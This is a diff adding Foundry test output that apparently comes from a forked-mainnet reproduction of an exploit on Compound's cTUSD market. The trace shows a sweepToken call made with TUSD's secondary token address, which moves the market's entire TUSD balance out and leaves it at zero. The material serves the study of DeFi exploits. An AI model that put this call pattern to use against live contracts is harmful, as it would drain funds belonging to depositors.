@@ -1,0 +1,50 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/CompoundTusd_exp.sol:ContractTest
+[PASS] testExample() (gas: 76941)
+Logs:
+  Before exploit, Compound TUSD balance:: 39961358379339258374306712
+  After exploit, Compound TUSD balance:: 0
+
+Traces:
+  [5795] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 14266479 [1.426e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [81741] ContractTest::testExample()
+    ├─ [7707] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86) [staticcall]
+    │   ├─ [2508] 0xffc40F39806F1400d8278BfD33823705b5a4c196::balanceOf(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86) [delegatecall]
+    │   │   └─ ← [Return] 39961358379339258374306712 [3.996e25]
+    │   └─ ← [Return] 39961358379339258374306712 [3.996e25]
+    ├─ emit log_named_uint(key: "Before exploit, Compound TUSD balance:", val: 39961358379339258374306712 [3.996e25])
+    ├─ [53896] 0x12392F67bdf24faE0AF363c24aC620a2f67DAd86::sweepToken(0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E)
+    │   ├─ [48682] 0xa035b9e130F2B1AedC733eEFb1C67Ba4c503491F::sweepToken(0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E) [delegatecall]
+    │   │   ├─ [4951] 0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E::balanceOf(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86) [staticcall]
+    │   │   │   ├─ [1247] 0x0000000000085d4780B73119b644AE5ecd22b376::delegateBalanceOf(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86)
+    │   │   │   │   ├─ [548] 0xffc40F39806F1400d8278BfD33823705b5a4c196::delegateBalanceOf(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000210e259419ba44043abb98
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000210e259419ba44043abb98
+    │   │   │   └─ ← [Return] 39961358379339258374306712 [3.996e25]
+    │   │   ├─ [35826] 0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E::transfer(0x6d903f6003cca6255D85CcA4D3B5E5146dC33925, 39961358379339258374306712 [3.996e25])
+    │   │   │   ├─ [33741] 0x0000000000085d4780B73119b644AE5ecd22b376::delegateTransfer(0x6d903f6003cca6255D85CcA4D3B5E5146dC33925, 39961358379339258374306712 [3.996e25], 0x12392F67bdf24faE0AF363c24aC620a2f67DAd86)
+    │   │   │   │   ├─ [33030] 0xffc40F39806F1400d8278BfD33823705b5a4c196::delegateTransfer(0x6d903f6003cca6255D85CcA4D3B5E5146dC33925, 39961358379339258374306712 [3.996e25], 0x12392F67bdf24faE0AF363c24aC620a2f67DAd86) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: 0x12392F67bdf24faE0AF363c24aC620a2f67DAd86, to: 0x6d903f6003cca6255D85CcA4D3B5E5146dC33925, value: 39961358379339258374306712 [3.996e25])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x1b13e8da2ac63131998ee32305704af215978f151f1646bbe670a6666596bfd7: 0x000000000000000000000000000000000000000000210e259419ba44043abb98 → 0
+    │   │   │   │   │   │   @ 0xd8442c492d808c32ae7295630b24e28d8ac3f904c9bbfd5d1a8f5cd0840dd69a: 0 → 0x000000000000000000000000000000000000000000210e259419ba44043abb98
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [1207] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86) [staticcall]
+    │   ├─ [508] 0xffc40F39806F1400d8278BfD33823705b5a4c196::balanceOf(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "After exploit, Compound TUSD balance:", val: 0)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.18s (1.66ms CPU time)
+
+Ran 1 test suite in 1.73s (1.18s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
